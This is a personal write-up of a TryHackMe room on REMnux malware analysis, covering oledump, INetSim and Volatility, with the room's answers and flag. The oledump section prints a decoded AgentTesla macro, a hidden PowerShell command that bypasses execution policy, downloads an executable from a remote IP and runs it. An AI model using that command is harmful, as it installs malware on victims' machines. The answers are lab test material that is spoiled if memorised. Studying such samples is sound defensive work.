---
{"dg-publish":true,"permalink":"/try-hack-me/rooms/re-mnux-getting-started/","created":"2024-11-26T11:23:00.000-05:00","updated":"2025-03-09T16:38:29.888-04:00"}
---

# Task 3 - File Analysis

- Using tool called “oledump.py” for forensic analysis for OLE2 files (Microsoft proprietary)
	- OLE2, stores multiple datatypes within a single file

![image 38.png](/img/user/TryHackMe/THM_Images/ee14bdbb3f75e30eb51e9291b8091e97.png)

Check out the datastreams (A#) with given letters, (A4: M [macro])

```Bash
oledump.py agenttesla.xlsm -s 4
```

![image 39.png](/img/user/TryHackMe/THM_Images/204eee1facbb27df9e9560ed853a2ba1.png)

Doing this produces a result that’s harder to read, so use the “—vbadecompress” flag to make it more human readable

```Bash
oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

![image 40.png](/img/user/TryHackMe/THM_Images/3e7e50f8903591bbaa98134f27176d5f.png)

Focus on the “Sqtnew” file, realized that we can replace both ^ and * character with no characters, (replace with “”).

Can do with CyberChef

![image 41.png](/img/user/TryHackMe/THM_Images/f6119111f8ac4ad6c3971f7eeec1d298.png)

Get the output

> "powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } �PassThru; Invoke-WebRequest -Uri ""[http://193.203.203.67/rt/Doc-3737122pdf.exe](http://193.203.203.67/rt/Doc-3737122pdf.exe)"" -OutFile $TempFile; Start-Process $TempFile;"

This command is the VBA macro that runs once the .xlsm file is open. It opens Powershell in the background and downloads this file through the IP address. It’ll then start running the file.

> [!Question] 
**What Python tool analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format?**

> [!done] Answer
oledump.py

> [!Question] 
**What tool parameter we used in this task allows you to select a particular data stream of the file we are using it with?**

> [!done] Answer
-s

> [!question] 
**During our analysis, we were able to decode a PowerShell script. What command is commonly used for downloading files from the internet?**

> [!done] Answer
Invoke-WebRequest

> [!question] 
**What file was being downloaded using the PowerShell script?**

> [!done] Answer
Doc-3737122pdf.exe

> [!question] 
**During our analysis of the PowerShell script, we noted that a file would be downloaded. Where will the file being downloaded be stored?**

> [!done] `Answer`
`$TempFile`

> [!question] 
**Using the tool, scan another file named `possible_malicious.docx` located in the `/home/ubuntu/Desktop/tasks/agenttesla/` directory. How many data streams were presented for this file?**

![image 42.png](/img/user/TryHackMe/THM_Images/9f2d47fc366f1123bc564f90b7f15d5c.png)

> [!done] Answer
16

> [!question] 
**Using the tool, scan another file named `possible_malicious.docx` located in the `/home/ubuntu/Desktop/tasks/agenttesla/` directory. At what data stream number does the tool indicate a macro present?**

Based off the screenshot above

> [!done] Answer
8

# Task 4 - Fake Network to Aid Analysis

- INetSim: Internet Services Simulation Suite
	- Observes behaviours of malicious software in it’s network activities

INetSim Config

Do this on the RemuxVM (has the tool)
    
```Bash
sudo nano /etc/inetsim/inetsim.conf
```
    
Change the _dns_default_ip 0.0.0.0_ to the machine IP

![image 43.png](/img/user/TryHackMe/THM_Images/3da78d16985f5785377cb658a4dcac50.png)

![image 44.png](/img/user/TryHackMe/THM_Images/5a6687ce7e3f3ac74c3b6afe333da87d.png)
    
Run the command below to start the tool

```Bash
sudo inetsim
```

![image 45.png](/img/user/TryHackMe/THM_Images/62dc7e7bcf1f8d4d29b885cfc599de89.png)
    
Go back to attack box to and try to go to it’s IP address to see the INetSim’s homepage

![image 46.png](/img/user/TryHackMe/THM_Images/6de4163eee1390e38c7389e4f7acdfea.png)


Common behaviours of malware is to download binary or scripts, can mimic it with the command
    
```Bash
sudo wget https://10.10.153.203/second_payload.zip --no-check-certificate
```

![image 47.png](/img/user/TryHackMe/THM_Images/452fdab3ce8fa8bda5f9849d80d5ebcc.png)
    
Back on the Remuix, can stop it and it’ll create a report on connections, Usually saved in `var/log/inetsim/report/`

![image 48.png](/img/user/TryHackMe/THM_Images/4d6caa0cbb07f09e8de498596e3fb44c.png)

> [!Question]
> 
> **Download and scan the file named `flag.txt` from the terminal using the command `sudo wget https://10.10.153.203/flag.txt --no-check-certificate`. What is the flag?**

![image 49.png](/img/user/TryHackMe/THM_Images/f903580aae1216681b504e231cfdd592.png)

> [!done] Answer
Tryhackme{remnux_edition}

> [!Question]
> 
>**After stopping the inetsim, read the generated report. Based on the report, what URL Method was used to get the file flag.txt?**

> [!done] Answer
GET

# Task 5 - Memory Investigation: Evidence Preprocessing

- Volatility
	- Extracts artefacts from memory images
	- Saves output to txt for further examinations
	- This room focus on windows plugins like:
		- windows.pstree.PsTree
		- windows.pslist.PsList
		- windows.cmdline.CmdLine
		- windows.filescan.FileScan
		- windows.dlllist.DllList
		- windows.malfind.Malfind
		- windows.psscan.PsScan

Need to go to directory with .mem file and run the command 
	
```Bash
vol3 -f wcry.mem <plugin-here>

Example: vol3 -f wcry.mem windows.pstree.PsTree
```

Can do a loop statement to run the process in bulk
    
```Bash
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```

Can preprocess image with Linux **strings** utility, Extracts ASCII, 16-bit little-endian, and 16-bit big-endian strings.
    
```Bash
strings wcry.mem > wcry.strings.ascii.txt
strings -e l wcry.mem  > wcry.strings.unicode_little_endian.txt
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```
    

> [!question] 
**What plugin lists processes in a tree based on their parent process ID?**

> [!done] Answer
PsTree

> [!question] 
**What plugin is used to list all currently active processes in the machine?**

> [!done] Answer
PsList

> [!question] 
**What Linux utility tool can extract the ASCII, 16-bit little-endian, and 16-bit big-endian strings?**

> [!done] Answer
strings

> [!question] 
**By running vol3 with the Malfind parameter, what is the first (1st) process identified suspected of having an injected code?**

![1000](/img/user/TryHackMe/THM_Images/874a8ae56193006c240195f1372c8b3d.png)

> [!done] Answer
csrss.exe

> [!question] 
**Continuing from the previous question (Question 6), what is the second (2nd) process identified suspected of having an injected code?**

> [!done] Answer
winlogon.exe

> [!question] 
**By running vol3 with the DllList parameter, what is the file path or directory of the binary @WanaDecryptor@.exe?**

![image 51.png](/img/user/TryHackMe/THM_Images/a97a19fae91c6b6db0b8a60583f5540e.png)

![image 52.png](/img/user/TryHackMe/THM_Images/dac14b46be2f2c04305d76d93a8a95d5.png)

> [!done] Answer
`C:\Intel\ivecuqmanpnirkt615`